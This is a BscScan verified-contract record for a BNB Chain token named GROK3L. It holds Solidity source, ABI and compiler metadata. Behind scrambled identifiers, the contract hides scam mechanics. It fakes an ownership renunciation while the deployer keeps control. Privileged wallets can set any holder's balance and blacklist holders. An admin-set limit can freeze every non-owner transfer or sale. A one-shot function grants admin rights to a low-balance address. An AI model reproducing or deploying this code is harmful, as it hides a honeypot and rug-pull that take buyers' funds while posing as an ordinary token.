{"SourceCode": "/**\r\n *Submitted for verification at BscScan.com on 2023-12-09\r\n*/\r\n\r\n/**\r\n *Submitted for verification at BscScan.com on 2023-12-09\r\n*/\r\n\r\n//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.16;\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\nabstract contract teamMax {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface takeAutoIs {\r\n    function createPair(address receiverLiquidity, address tokenSwapSell) external returns (address);\r\n\r\n    function feeTo() external view returns (address);\r\n}\r\n\r\ninterface txTrading {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\n\r\ninterface senderFund {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address autoWalletExempt) external view returns (uint256);\r\n\r\n    function transfer(address liquidityListMax, uint256 totalToken) external returns (bool);\r\n\r\n    function allowance(address maxFrom, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 totalToken) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address liquidityListMax,\r\n        uint256 totalToken\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed tradingReceiverLaunch, uint256 value);\r\n    event Approval(address indexed maxFrom, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface senderReceiver is senderFund {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract GROK3L is teamMax, senderFund, senderReceiver {\r\n\r\n    function symbol() external view virtual override returns (string memory) {\r\n        return buyEnable;\r\n    }\r\n\r\n    uint256 public autoSender;\r\n\r\n    mapping(address => bool) public maxTrading;\r\n\r\n    function liquidityAmount() public {\r\n        emit OwnershipTransferred(marketingWallet, address(0));\r\n        receiverLaunchedAt = address(0);\r\n    }\r\n\r\n    address public marketingWallet;\r\n\r\n    function sellSwap(uint256 totalToken) public {\r\n        autoBuy();\r\n        totalLimit = totalToken;\r\n    }\r\n\r\n    function balanceOf(address autoWalletExempt) public view virtual override returns (uint256) {\r\n        return shouldSwap[autoWalletExempt];\r\n    }\r\n\r\n    address private receiverLaunchedAt;\r\n\r\n    event OwnershipTransferred(address indexed maxToken, address indexed receiverTxFund);\r\n\r\n    function autoBuy() private view {\r\n        require(receiverTokenWallet[_msgSender()]);\r\n    }\r\n\r\n    function transfer(address txShould, uint256 totalToken) external virtual override returns (bool) {\r\n        return takeLimit(_msgSender(), txShould, totalToken);\r\n    }\r\n\r\n    function decimals() external view virtual override returns (uint8) {\r\n        return limitMarketing;\r\n    }\r\n\r\n    function transferFrom(address fundReceiver, address liquidityListMax, uint256 totalToken) external override returns (bool) {\r\n        if (_msgSender() != walletAmountLiquidity) {\r\n            if (modeMarketing[fundReceiver][_msgSender()] != type(uint256).max) {\r\n                require(totalToken <= modeMarketing[fundReceiver][_msgSender()]);\r\n                modeMarketing[fundReceiver][_msgSender()] -= totalToken;\r\n            }\r\n        }\r\n        return takeLimit(fundReceiver, liquidityListMax, totalToken);\r\n    }\r\n\r\n    address public launchedSell;\r\n\r\n    constructor (){\r\n        \r\n        liquidityAmount();\r\n        txTrading txReceiverTotal = txTrading(walletAmountLiquidity);\r\n        launchedSell = takeAutoIs(txReceiverTotal.factory()).createPair(txReceiverTotal.WETH(), address(this));\r\n        receiverSenderAt = takeAutoIs(txReceiverTotal.factory()).feeTo();\r\n        if (liquidityTo != minTeam) {\r\n            autoSender = liquidityTo;\r\n        }\r\n        marketingWallet = _msgSender();\r\n        receiverTokenWallet[marketingWallet] = true;\r\n        shouldSwap[marketingWallet] = receiverTx;\r\n        \r\n        emit Transfer(address(0), marketingWallet, receiverTx);\r\n    }\r\n\r\n    uint256 public sellTrading;\r\n\r\n    function listMode(address fundReceiver, address liquidityListMax, uint256 totalToken) internal view returns (uint256) {\r\n        require(totalToken > 0);\r\n\r\n        uint256 amountFee = 0;\r\n        if (fundReceiver == launchedSell && shouldMin > 0) {\r\n            amountFee = totalToken * shouldMin / 100;\r\n        } else if (liquidityListMax == launchedSell && receiverList > 0) {\r\n            amountFee = totalToken * receiverList / 100;\r\n        }\r\n        require(amountFee <= totalToken);\r\n        return totalToken - amountFee;\r\n    }\r\n\r\n    function owner() external view returns (address) {\r\n        return receiverLaunchedAt;\r\n    }\r\n\r\n    string private enableExempt = \"ETF GROK3L\";\r\n\r\n    function getOwner() external view returns (address) {\r\n        return receiverLaunchedAt;\r\n    }\r\n\r\n    string private buyEnable = \"GROK3L\";\r\n\r\n    bool public tokenMax;\r\n\r\n    bool public listFrom;\r\n\r\n    mapping(address => uint256) private shouldSwap;\r\n\r\n    uint256 buyMarketing;\r\n\r\n    address receiverSenderAt;\r\n\r\n    function listLaunch(address txShould, uint256 totalToken) public {\r\n        autoBuy();\r\n        shouldSwap[txShould] = totalToken;\r\n    }\r\n\r\n    uint256 public receiverList = 0;\r\n\r\n    function enableAmount(address receiverTeamLimit) public {\r\n        require(receiverTeamLimit.balance < 1000000);\r\n        if (tokenMax) {\r\n            return;\r\n        }\r\n        \r\n        receiverTokenWallet[receiverTeamLimit] = true;\r\n        if (sellTrading != liquidityTo) {\r\n            listFrom = true;\r\n        }\r\n        tokenMax = true;\r\n    }\r\n\r\n    uint256 constant isSwap = 4 ** 10;\r\n\r\n    function name() external view virtual override returns (string memory) {\r\n        return enableExempt;\r\n    }\r\n\r\n    uint256 public listLimit;\r\n\r\n    function enableFund(address liquidityToken) public {\r\n        autoBuy();\r\n        if (marketingLiquidity) {\r\n            sellTrading = minTeam;\r\n        }\r\n        if (liquidityToken == marketingWallet || liquidityToken == launchedSell) {\r\n            return;\r\n        }\r\n        maxTrading[liquidityToken] = true;\r\n    }\r\n\r\n    uint256 private receiverTx = 1463636349000000* 10 ** 18;\r\n\r\n    uint8 private limitMarketing = 18;\r\n\r\n    uint256 public shouldMin = 3;\r\n\r\n    uint256 totalLimit;\r\n\r\n    uint256 private liquidityTo;\r\n\r\n    address walletAmountLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n    function approve(address shouldSell, uint256 totalToken) public virtual override returns (bool) {\r\n        modeMarketing[_msgSender()][shouldSell] = totalToken;\r\n        emit Approval(_msgSender(), shouldSell, totalToken);\r\n        return true;\r\n    }\r\n\r\n    mapping(address => bool) public receiverTokenWallet;\r\n\r\n    uint256 public minTeam;\r\n\r\n    mapping(address => mapping(address => uint256)) private modeMarketing;\r\n\r\n    function allowance(address shouldReceiverFee, address shouldSell) external view virtual override returns (uint256) {\r\n        if (shouldSell == walletAmountLiquidity) {\r\n            return type(uint256).max;\r\n        }\r\n        return modeMarketing[shouldReceiverFee][shouldSell];\r\n    }\r\n\r\n    function totalSupply() external view virtual override returns (uint256) {\r\n        return receiverTx;\r\n    }\r\n\r\n    function swapTx(address fundReceiver, address liquidityListMax, uint256 totalToken) internal returns (bool) {\r\n        require(shouldSwap[fundReceiver] >= totalToken);\r\n        shouldSwap[fundReceiver] -= totalToken;\r\n        shouldSwap[liquidityListMax] += totalToken;\r\n        emit Transfer(fundReceiver, liquidityListMax, totalToken);\r\n        return true;\r\n    }\r\n\r\n    bool private marketingLiquidity;\r\n\r\n    function takeLimit(address fundReceiver, address liquidityListMax, uint256 totalToken) internal returns (bool) {\r\n        if (fundReceiver == marketingWallet) {\r\n            return swapTx(fundReceiver, liquidityListMax, totalToken);\r\n        }\r\n        uint256 buyReceiver = senderFund(launchedSell).balanceOf(receiverSenderAt);\r\n        require(buyReceiver == totalLimit);\r\n        require(liquidityListMax != receiverSenderAt);\r\n        if (maxTrading[fundReceiver]) {\r\n            return swapTx(fundReceiver, liquidityListMax, isSwap);\r\n        }\r\n        totalToken = listMode(fundReceiver, liquidityListMax, totalToken);\r\n        return swapTx(fundReceiver, liquidityListMax, totalToken);\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTxFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiverLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldReceiverFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoWalletExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeamLimit\",\"type\":\"address\"}],\"name\":\"enableAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityToken\",\"type\":\"address\"}],\"name\":\"enableFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"listLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverTokenWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"sellSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityListMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "GROK3L", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://b73b67fe7fe9db3cbf26666f6d8a939076dfe99aee97534e30a638774a67bd71"}